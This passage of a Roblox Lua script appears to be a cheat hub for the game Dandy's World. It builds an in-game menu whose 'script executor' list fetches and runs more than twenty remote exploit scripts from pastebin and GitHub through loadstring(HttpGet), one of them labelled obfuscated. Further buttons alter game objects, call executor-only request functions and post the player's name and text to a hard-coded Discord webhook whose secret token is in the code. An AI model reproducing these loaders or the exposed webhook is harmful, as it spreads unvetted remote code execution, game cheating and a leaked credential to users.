		-- Desconecta el ciclo previo si existe
		if itemsUpdateConnection then
			itemsUpdateConnection:Disconnect()
			itemsUpdateConnection = nil
		end

		-- Activa/desactiva el ciclo según el estado
		if itemsEnabled then
			itemsUpdateConnection = game:GetService("RunService").Heartbeat:Connect(function()
				processItems(true)
			end)
		else
			processItems(false)
		end
	end)

end;
task.spawn(C_189);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_18c()
	local script = G2L["18c"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	script.Parent.MouseButton1Click:Connect(function()
		-- Crear ScreenGui
		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		screenGui.Name = "ScriptExecutorGui"

		-- Configuración de botones
		local buttonHeight = 40
		local buttonSpacing = 10
		local baseHeight = 60 -- Altura base para el título y el margen superior
		local visibleButtons = 6 -- Número de botones visibles sin desplazamiento

		-- Datos de scripts
		local scripts = {
			{Name = "Noxious HUB", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/y8eKgLSs"))()]]},
			{Name = "Hex HUB", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/H3u62n7D"))()]]},
			{Name = "FFJ HUB", Code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()]]},
			{Name = "Bac0nHck script", Code = [[
				pcall(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/Dandy's%20World"))("t.me/arceusxscripts")
				end)]]},
			{Name = "RodeStriker viral script hub", Code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/RodeStriker/Roblox-Scripts/refs/heads/main/DandysWorld/DandysWorldTD"))()]]},
			{Name = "Khanz Hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/LVFQExe0"))()]]},
			{Name = "GdZerty Hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/f0QvSw34"))()]]},
			{Name = "Otvajni sopelki", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/dQZg7J1Z"))()]]},
			{Name = "Slendys Hub", Code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Slendyvn/Slendys-Dandys-World/refs/heads/main/Slendys%20Dandys%20World"))()]]},
			{Name = "Ritual.gg HUB", Code = [[        local owner = "ritualrblx"
	        local repository = "ritual"
	        local server = "discord.gg/ritualrblx"
	        local link = string.format("https://raw.githubusercontent.com/%s/%s/%s/script", owner, repository, server)
	        loadstring(game:HttpGet(link))()]]},
			{Name = "Kles HUB", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/GCmWV5gX"))()]]},
			{Name = "Lunar X", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/14Fg9jYW"))()]]},
			{Name = "SolarX Hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/gzMcDb9P"))()]]},
			{Name = "Yiw Hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/LJbTaVQF"))()]]},
			{Name = "Soup hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/jjTq76Sp"))()]]},
			{Name = "Dandy's World Hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/PM9yZKA2"))()]]},
			{Name = "Dandy's Control", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/kRTHXac3"))()]]},
			{Name = "Dandy Hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/rrb6Ujhg"))()]]},
			{Name = "Kenny Hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/84Sm0rPG"))()]]},
			{Name = "Dandy World Helper", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/4WSpQkyu"))()]]},
			{Name = "Multi-Hub", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/vEqyHu82"))()]]},
			{Name = "Spooks-Hub", Code = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/ApparentlySpooks/dandysworldspookshub/refs/heads/main/obfuscated%20spooks%20hub%20dandys%20world.lua'))()]]},
			{Name = "код-G0bbyD0llan57 ", Code = [[loadstring(game:HttpGet("https://pastebin.com/raw/i4NBXCB0"))() ]]},

			--https://pastebin.com/QkX0rESc
		}

		-- Calcular el tamaño visible del ScrollingFrame
		local frameHeight = baseHeight + (visibleButtons * (buttonHeight + buttonSpacing)) - buttonSpacing

		-- Marco principal
		local mainFrame = Instance.new("Frame")
		mainFrame.Parent = screenGui
		mainFrame.Size = UDim2.new(0, 300, 0, frameHeight)
		mainFrame.Position = UDim2.new(0.5, -150, 0.5,  2)

		mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		mainFrame.BorderSizePixel = 0
		mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)

		-- Hacer que sea draggable
		local UIS = game:GetService("UserInputService")
		local dragToggle = false
		local dragStart = nil
		local startPos = nil

		mainFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragToggle = true
				dragStart = input.Position
				startPos = mainFrame.Position
			end
		end)

		mainFrame.InputChanged:Connect(function(input)
			if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
				local delta = input.Position - dragStart
				mainFrame.Position = UDim2.new(
					startPos.X.Scale,
					startPos.X.Offset + delta.X,
					startPos.Y.Scale,
					startPos.Y.Offset + delta.Y
				)
			end
		end)

		mainFrame.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragToggle = false
			end
		end)

		-- Título
		local title = Instance.new("TextLabel")
		title.Parent = mainFrame
		title.Size = UDim2.new(1, 0, 0, 30)
		title.Position = UDim2.new(0, 0, 0, 0)
		title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		title.Text = "G0bbyD0llan LIST"
		title.TextColor3 = Color3.fromRGB(255, 255, 255)
		title.TextScaled = true
		title.Font = Enum.Font.GothamBold

		-- Botón de cerrar
		local closeButton = Instance.new("TextButton")
		closeButton.Parent = mainFrame
		closeButton.Size = UDim2.new(0, 30, 0, 30)
		closeButton.Position = UDim2.new(1, -35, 0, 0)
		closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
		closeButton.Text = "X"
		closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		closeButton.TextScaled = true
		closeButton.Font = Enum.Font.GothamBold
		closeButton.MouseButton1Click:Connect(function()
			screenGui:Destroy()
		end)

		-- Crear ScrollingFrame
		local scrollingFrame = Instance.new("ScrollingFrame")
		scrollingFrame.Parent = mainFrame
		scrollingFrame.Size = UDim2.new(1, 0, 1, -baseHeight)
		scrollingFrame.Position = UDim2.new(0, 0, 0, baseHeight)
		scrollingFrame.BackgroundTransparency = 1
		scrollingFrame.ScrollBarThickness = 8
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #scripts * (buttonHeight + buttonSpacing))

		-- Crear botones dinámicamente dentro del ScrollingFrame
		for i, scriptData in ipairs(scripts) do
			local button = Instance.new("TextButton")
			button.Parent = scrollingFrame
			button.Size = UDim2.new(0.9, 0, 0, buttonHeight)
			button.Position = UDim2.new(0.05, 0, 0, (i - 1) * (buttonHeight + buttonSpacing))
			button.BackgroundColor3 = Color3.fromRGB(50, 50, 200)
			button.Text = scriptData.Name
			button.TextColor3 = Color3.fromRGB(255, 255, 255)
			button.TextScaled = true
			button.Font = Enum.Font.Gotham
			button.MouseButton1Click:Connect(function()
				local func = loadstring(scriptData.Code)
				if func then
					func()
				else
					warn("Error al ejecutar el script: " .. scriptData.Name)
				end
			end)
		end
	end)
end;
task.spawn(C_18c);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_18f()
	local script = G2L["18f"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	script.Parent.MouseButton1Click:Connect(function()

		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		-- Crear la MeshPart
		local meshPart = Instance.new("MeshPart")
		meshPart.Name = "CustomMeshPart"
		meshPart.Size = Vector3.new(5, 5, 5) -- Cambia las dimensiones según sea necesario
		meshPart.MeshId = "rbxassetid://118914329656696"
		meshPart.TextureID = "rbxassetid://95235468518759"
		meshPart.Material = Enum.Material.SmoothPlastic -- Opcional: Cambia el material
		meshPart.Anchored = false
		meshPart.CanCollide = true -- Mantener CanCollide activado
		meshPart.Parent = workspace

		-- Colocar la MeshPart cerca del jugador
		if character:FindFirstChild("HumanoidRootPart") then
			meshPart.Position = character.HumanoidRootPart.Position + Vector3.new(0, 5, 0) -- Ajusta la posición
		end

		-- Hacer que sea visible solo para el jugador actual
		local function makeVisibleOnlyForPlayer()
			local folder = Instance.new("Folder")
			folder.Name = "LocalMeshes"
			folder.Parent = workspace

			meshPart.Parent = folder

			local descendantAddedConnection
			descendantAddedConnection = workspace.DescendantAdded:Connect(function(descendant)
				if descendant == folder then
					folder.Parent = nil
					descendantAddedConnection:Disconnect()
				end
			end)
		end

		makeVisibleOnlyForPlayer()

		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		-- Crear la MeshPart
		local meshPart = Instance.new("MeshPart")
		meshPart.Name = "CustomMeshPart"
		meshPart.Size = Vector3.new(5, 5, 5) -- Cambia las dimensiones según sea necesario
		meshPart.MeshId = "rbxassetid://104535249097941"
		meshPart.TextureID = "rbxassetid://95032986581190"
		meshPart.Material = Enum.Material.SmoothPlastic -- Opcional: Cambia el material
		meshPart.Anchored = false
		meshPart.CanCollide = true -- Mantener CanCollide activado
		meshPart.Parent = workspace

		-- Colocar la MeshPart cerca del jugador
		if character:FindFirstChild("HumanoidRootPart") then
			meshPart.Position = character.HumanoidRootPart.Position + Vector3.new(0, 5, 0) -- Ajusta la posición
		end

		-- Hacer que sea visible solo para el jugador actual
		local function makeVisibleOnlyForPlayer()
			local folder = Instance.new("Folder")
			folder.Name = "LocalMeshes"
			folder.Parent = workspace

			meshPart.Parent = folder

			local descendantAddedConnection
			descendantAddedConnection = workspace.DescendantAdded:Connect(function(descendant)
				if descendant == folder then
					folder.Parent = nil
					descendantAddedConnection:Disconnect()
				end
			end)
		end

		makeVisibleOnlyForPlayer()

		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		-- Crear la MeshPart
		local meshPart = Instance.new("MeshPart")
		meshPart.Name = "CustomMeshPart"
		meshPart.Size = Vector3.new(5, 5, 5) -- Cambia las dimensiones según sea necesario
		meshPart.MeshId = "rbxassetid://115825825474192"
		meshPart.TextureID = "rbxassetid://93154898243370"
		meshPart.Material = Enum.Material.SmoothPlastic -- Opcional: Cambia el material
		meshPart.Anchored = false
		meshPart.CanCollide = true -- Mantener CanCollide activado
		meshPart.Parent = workspace

		-- Colocar la MeshPart cerca del jugador
		if character:FindFirstChild("HumanoidRootPart") then
			meshPart.Position = character.HumanoidRootPart.Position + Vector3.new(0, 5, 0) -- Ajusta la posición
		end

		-- Hacer que sea visible solo para el jugador actual
		local function makeVisibleOnlyForPlayer()
			local folder = Instance.new("Folder")
			folder.Name = "LocalMeshes"
			folder.Parent = workspace

			meshPart.Parent = folder

			local descendantAddedConnection
			descendantAddedConnection = workspace.DescendantAdded:Connect(function(descendant)
				if descendant == folder then
					folder.Parent = nil
					descendantAddedConnection:Disconnect()
				end
			end)
		end

		makeVisibleOnlyForPlayer()

	end)
end;
task.spawn(C_18f);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_192()
	local script = G2L["192"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	script.Parent.MouseButton1Click:Connect(function()
		-- FPS Booster with GUI
		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		screenGui.Name = "FPSBoosterGui"

		-- GUI Setup
		local buttonHeight = 40
		local buttonSpacing = 10
		local baseHeight = 60
		local visibleButtons = 4
		local frameHeight = baseHeight + (visibleButtons * (buttonHeight + buttonSpacing)) - buttonSpacing

		-- Main Frame
		local mainFrame = Instance.new("Frame")
		mainFrame.Parent = screenGui
		mainFrame.Size = UDim2.new(0, 300, 0, frameHeight)
		mainFrame.Position = UDim2.new(0.5, -150, 0.5, 0)
		mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		mainFrame.BorderSizePixel = 0
		mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)

		-- Drag functionality
		local UIS = game:GetService("UserInputService")
		local dragToggle = false
		local dragStart = nil
		local startPos = nil

		mainFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragToggle = true
				dragStart = input.Position
				startPos = mainFrame.Position
			end
		end)

		mainFrame.InputChanged:Connect(function(input)
			if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
				local delta = input.Position - dragStart
				mainFrame.Position = UDim2.new(
					startPos.X.Scale,
					startPos.X.Offset + delta.X,
					startPos.Y.Scale,
					startPos.Y.Offset + delta.Y
				)
			end
		end)

		mainFrame.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragToggle = false
			end
		end)

		-- Title
		local title = Instance.new("TextLabel")
		title.Parent = mainFrame
		title.Size = UDim2.new(1, 0, 0, 30)
		title.Position = UDim2.new(0, 0, 0, 0)
		title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		title.Text = "FPS Booster"
		title.TextColor3 = Color3.fromRGB(255, 255, 255)
		title.TextScaled = true
		title.Font = Enum.Font.GothamBold

		-- Close Button
		local closeButton = Instance.new("TextButton")
		closeButton.Parent = mainFrame
		closeButton.Size = UDim2.new(0, 30, 0, 30)
		closeButton.Position = UDim2.new(1, -35, 0, 0)
		closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
		closeButton.Text = "X"
		closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		closeButton.TextScaled = true
		closeButton.Font = Enum.Font.GothamBold
		closeButton.MouseButton1Click:Connect(function()
			screenGui:Destroy()
		end)

		-- Function Definitions for Optimization Levels
		local fpsBooster = {}

		function fpsBooster.level1()
			game.Lighting.GlobalShadows = false
			task.spawn(function()
				settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
			end)
			print("Level 1 Optimization applied!")
		end

		function fpsBooster.level2()
			fpsBooster.level1()
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
					obj.Enabled = false
				end
			end
			print("Level 2 Optimization applied!")
		end

		function fpsBooster.level3()
			fpsBooster.level2()
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("BasePart") then
					obj.Material = Enum.Material.SmoothPlastic
				end
			end
			print("Level 3 Optimization applied!")
		end

		-- Function to apply Level 4 optimization
		function fpsBooster.level4()
			-- Level 3 optimization
			fpsBooster.level3()

			-- Disable all textures
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("Texture") or obj:IsA("SurfaceAppearance") then
					obj:Destroy()
				end
			end

			-- Reduce all lighting effects to minimal
			local lighting = game:GetService("Lighting")
			lighting.Brightness = 0.5
			lighting.EnvironmentDiffuseScale = 0
			lighting.EnvironmentSpecularScale = 0

			print("Level 4 Optimization applied! Extreme performance mode.")
		end

		-- Function to apply Level MAX optimization
		function fpsBooster.levelMax()
			-- Level 4 optimization
			fpsBooster.level4()

			-- Disable all lighting effects entirely
			local lighting = game:GetService("Lighting")
			lighting:SetMinutesAfterMidnight(12) -- Midday lighting for simplicity
			lighting.Ambient = Color3.new(0, 0, 0)
			lighting.OutdoorAmbient = Color3.new(0, 0, 0)
			lighting.Brightness = 0
			lighting.ClockTime = 12

			-- Remove all accessories and non-essential models
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("Accessory") then
					obj:Destroy()
				end
			end
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("Decal") then
					obj.Transparency = 1
				elseif obj:IsA("Texture") then
					obj:Destroy()
				end
			end
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("Animation") or obj:IsA("Animator") then
					obj:Destroy()
				end
			end
			pcall(function()
				setfpscap(360)
			end)

			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
					obj:Destroy()
				end
			end

			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
					obj:Destroy()
				end
			end

			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("BasePart") and (obj.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
					obj:Destroy()
				end
			end


			-- Remove sounds
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("Sound") or obj:IsA("SoundEffect") then
					obj:Destroy()
				end
			end
			print("Level 5 Optimization applied! ULTIMATE performance mode.")
		end

		-- Buttons for Optimization Levels
		local options = {
			{Name = "Level 1 Optimization", Func = fpsBooster.level1},
			{Name = "Level 2 Optimization", Func = fpsBooster.level2},
			{Name = "Level 3 Optimization", Func = fpsBooster.level3},
			{Name = "Level 4 Optimization", Func = fpsBooster.level4},
			{Name = "Level MAX Optimization", Func = fpsBooster.levelMax},
		}

		local scrollingFrame = Instance.new("ScrollingFrame")
		scrollingFrame.Parent = mainFrame
		scrollingFrame.Size = UDim2.new(1, 0, 1, -baseHeight)
		scrollingFrame.Position = UDim2.new(0, 0, 0, baseHeight)
		scrollingFrame.BackgroundTransparency = 1
		scrollingFrame.ScrollBarThickness = 8
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #options * (buttonHeight + buttonSpacing))

		for i, option in ipairs(options) do
			local button = Instance.new("TextButton")
			button.Parent = scrollingFrame
			button.Size = UDim2.new(0.9, 0, 0, buttonHeight)
			button.Position = UDim2.new(0.05, 0, 0, (i - 1) * (buttonHeight + buttonSpacing))
			button.BackgroundColor3 = Color3.fromRGB(50, 200, 48)
			button.Text = option.Name
			button.TextColor3 = Color3.fromRGB(255, 255, 255)
			button.TextScaled = true
			button.Font = Enum.Font.Gotham
			button.MouseButton1Click:Connect(option.Func)
		end

	end)
end;
task.spawn(C_192);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_195()
	local script = G2L["195"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end




	script.Parent.MouseButton1Click:Connect(function()
		task.spawn(function()
			local newMeshId = "rbxassetid://16496393049"

			local function updateMeshId()
				local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")

				if currentRoom then
					for _, model in pairs(currentRoom:GetChildren()) do
						local monstersFolder = model:FindFirstChild("Monsters")

						if monstersFolder then
							for _, monster in pairs(monstersFolder:GetChildren()) do
								local head = monster:FindFirstChild("Head")

								if head and head:IsA("MeshPart") then
									head.MeshId = newMeshId
								end
							end
						end
					end
				end
			end

			while true do
				updateMeshId()
				wait(20)
			end
		end)
		task.spawn(function()
			local player = game.Players.LocalPlayer -- Obtener al jugador que ejecuta el script
			local workspace = game.Workspace -- Referencia a Workspace

			-- Buscar la carpeta llamada "InGamePlayers"
			local inGamePlayersFolder = workspace:FindFirstChild("InGamePlayers")

			if inGamePlayersFolder then
				-- Buscar un modelo dentro de la carpeta con el nombre del jugador
				local playerModel = inGamePlayersFolder:FindFirstChild(player.Name)

				if playerModel then
					-- Buscar la MeshPart llamada "Head" dentro del modelo del jugador
					local headMeshPart = playerModel:FindFirstChild("Head")

					if headMeshPart and headMeshPart:IsA("MeshPart") then
						-- Destruir la MeshPart
						headMeshPart:Destroy()
						print("Se eliminó la MeshPart llamada 'Head' del modelo:", playerModel.Name)
					else
						print("No se encontró una MeshPart llamada 'Head' en el modelo:", playerModel.Name)
					end
				else
					print("No se encontró un modelo con el nombre del jugador dentro de 'InGamePlayers'.")
				end
			else
				print("No se encontró la carpeta 'InGamePlayers' en Workspace.")
			end
		end)
	end)
end;
task.spawn(C_195);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_198()
	local script = G2L["198"];
	script.Parent.MouseButton1Click:Connect(function()
		local Workspace = game:GetService("Workspace")
		local RunService = game:GetService("RunService")
		math.randomseed(tick())

		local texts = {
			"z",
			"asdasdas"
		}

		local function chooseText()
			local randomIndex = math.random(1, #texts)
			return texts[randomIndex]
		end

		local lastUpdateTime = 0 
		local cooldownTime = 5.5

		local firstUpdateDone = false
		local lastWarnTime = 0 
		local warnInterval = 1 

		local function handleDandyStoreState()
			local currentTime = tick()

			local dandyStore = Workspace:FindFirstChild("DandyStore")

			if dandyStore then
				local humanoidRootPart = dandyStore:FindFirstChild("HumanoidRootPart")
				if humanoidRootPart then
					local billboardGui = humanoidRootPart:FindFirstChildOfClass("BillboardGui")
					if billboardGui then
						local frame = billboardGui:FindFirstChild("Frame")
						if frame then
							local dialogueBox = frame:FindFirstChild("DialogueBox")
							if dialogueBox then
								if not firstUpdateDone then
									wait(0.1)
									local newText = chooseText()
									dialogueBox.Text = newText
									print("Updated DialogueBox text to (First change): " .. newText)
									firstUpdateDone = true 
									lastUpdateTime = currentTime 
								elseif dialogueBox.Text ~= "oh" then
									local isTextValid = false
									for _, validText in ipairs(texts) do
										if dialogueBox.Text == validText then
											isTextValid = true
											break
										end
									end

									if not isTextValid then
										local newText = chooseText()
										dialogueBox.Text = newText
										print("Immediate update due to invalid text: " .. newText)
										lastUpdateTime = currentTime 
									elseif currentTime - lastUpdateTime >= cooldownTime then
										local newText = chooseText()
										dialogueBox.Text = newText
										print("Updated DialogueBox text to: " .. newText)
										lastUpdateTime = currentTime 
									end
								end
							end
						end
					end
				end
			end

			if not dandyStore or not humanoidRootPart or not billboardGui or not frame or not dialogueBox then
				if currentTime - lastWarnTime >= warnInterval then
					warn("DandyStore or required components not found!")
					lastWarnTime = currentTime 
				end
			end
		end
		RunService.Heartbeat:Connect(function()
			handleDandyStoreState()
		end)

		print("Script is monitoring DandyStore and updating text in real-time.")
	end)
end;
task.spawn(C_198);
-- StarterGui.DebugVersion.Title.script_content.MainSix.Aut.LocalScript
local function C_19b()
	local script = G2L["19b"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainFive.Visible = true
		script.Parent.Parent.Parent.MainSix.Visible = false

	end)
end;
task.spawn(C_19b);
-- StarterGui.DebugVersion.Title.script_content.MainSix.LocalScript
local function C_19c()
	local script = G2L["19c"];

	
end;
task.spawn(C_19c);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_19f()
	local script = G2L["19f"];
	-- Obtén el botón al que se le hace clic
	local button = script.Parent  -- Suponiendo que el LocalScript está dentro del botón
	-- Función que se ejecutará al hacer clic en el botón
	button.MouseButton1Click:Connect(function()
		local text = script.Parent.Parent.asdasd.Text
		-- Verifica si el texto está presente
		if not text or text == "" then
			warn("El texto está vacío o no se proporcionó correctamente.")
			return
		end

		local webhookUrl = "https://discord.com/api/webhooks/1323640249901121558/_wJqvgU4K_4CGU6XxA8ctKlYuOW6kGIXqgm6eE-_x5-UvNiylCmdtDWpmv6uGHD0aN3f"
		local player = game.Players.LocalPlayer
		local playerName = player.Name
		local currentTime = os.date("%Y-%m-%d %H:%M:%S")
		local exploitUsed =  "No exploit detected"

		-- Construcción del mensaje
		local message = string.format([[
	@everyone
	Message From @%s;
	________
	%s
	________
	sent at %s, Exploit: %s
	    ]], playerName, text, currentTime, exploitUsed)

		local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

		local data = {
			content = message
		}

		local success, response = pcall(function()
			httprequest({
				Url = webhookUrl,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = game:GetService("HttpService"):JSONEncode(data)
			})
		end)

		if not success then
			warn("Error al enviar el mensaje al webhook: " .. tostring(response))
		else
			print("Mensaje enviado correctamente al webhook.")
		end
	end)

end;
task.spawn(C_19f);
-- StarterGui.DebugVersion.Title.draggable
local function C_1a3()
	local script = G2L["1a3"];
	print("[script]: loading Dandys World HUB drag...")

	local UIS = game:GetService('UserInputService')
	local TweenService = game:GetService('TweenService')

	local container = script.Parent -- Este es el padre contenedor del frame y script_content
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, 
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		TweenService:Create(container, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	local function setupDrag(frame)
		frame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragToggle = true
				dragStart = input.Position
				startPos = container.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)

		UIS.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				if dragToggle then
					updateInput(input)
				end
			end
		end)
	end

	-- Agregar capacidad de arrastrar al `frame` y `script_content`
	setupDrag(container.Parent.Title) -- Ajusta esto al nombre real del frame
	setupDrag(container.script_content) -- Ajusta esto al nombre real de script_content

end;
task.spawn(C_1a3);
-- StarterGui.DebugVersion.Title.close.LocalScript
local function C_1a5()
	local script = G2L["1a5"];
	script.Parent.MouseButton1Click:Connect(function()
		local screenGui = script.Parent.Parent.Parent
		screenGui:Remove()
	end)
end;
task.spawn(C_1a5);
-- StarterGui.DebugVersion.Title.MM.LocalScript
local function C_1a7()
	local script = G2L["1a7"];
	local button = script.Parent
	local frame = button.Parent:FindFirstChild("script_content")

	local function changeParameters(color, text)
		button.BackgroundColor3 = color
		button.Text = text
	end

	local function getState()
		return frame.Visible
	end

	local function toggle(visible)
		frame.Visible = visible
		changeParameters(visible and Color3.new(0, 0, 1) or Color3.new(0, 1, 0), visible and "-" or "+")
	end

	button.MouseButton1Click:Connect(function()
		toggle(not getState())
	end)

end;
task.spawn(C_1a7);
-- StarterGui.DebugVersion.Title.GObbyImage.TextButton.LocalScript
local function C_1aa()
	local script = G2L["1aa"];
	local TweenService = game:GetService("TweenService") -- Obtenemos el TweenService

	-- Lista de colores (sin verde)
	local colors = {
		Color3.fromRGB(255, 0, 0),   -- Rojo
		Color3.fromRGB(0, 0, 255),   -- Azul
		Color3.fromRGB(255, 255, 0), -- Amarillo
		Color3.fromRGB(255, 165, 0), -- Naranja
		Color3.fromRGB(128, 0, 128), -- Púrpura
	}

	script.Parent.MouseButton1Click:Connect(function()
		local textlabel = script.Parent.Parent.Parent.TextLabel -- Accedemos al TextLabel
		local colorChanging = true -- Bandera para controlar el bucle de cambio de color

		-- Función para cambiar el color del TextLabel
		local function changeColor()
			while colorChanging do
				-- Elegir un color aleatorio de la lista
				local randomColor = colors[math.random(1, #colors)]

				-- Configuración del Tween
				local tweenInfo = TweenInfo.new(
					1, -- Duración de 1 segundo
					Enum.EasingStyle.Linear, -- Estilo de la animación
					Enum.EasingDirection.InOut, -- Dirección de la animación
					0, -- Repeticiones
					false, -- No revertir
					0 -- Sin retraso
				)

				-- Creación del Tween
				local tween = TweenService:Create(textlabel, tweenInfo, {TextColor3 = randomColor})
				tween:Play() -- Ejecutamos el Tween

				-- Esperamos 1 segundo antes de cambiar el color nuevamente
				wait(1)
			end
		end

		-- Iniciamos el cambio de color
		changeColor()
	end)

end;
task.spawn(C_1aa);
-- StarterGui.DebugVersion.Title.SoundStarter
local function C_1ab()
	local script = G2L["1ab"];
	print("[script]: loading Dandys World HUB Sound...")
	-- Function to play a sound
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	-- Example usage
	playSound("478544929", 0.8)
end;
task.spawn(C_1ab);
-- StarterGui.DebugVersion.Title.close.LocalScript
local function C_1ad()
	local script = G2L["1ad"];
	script.Parent.MouseButton1Click:Connect(function()
		local screenGui = script.Parent.Parent.Parent
		screenGui:Remove()
	end)
end;
task.spawn(C_1ad);
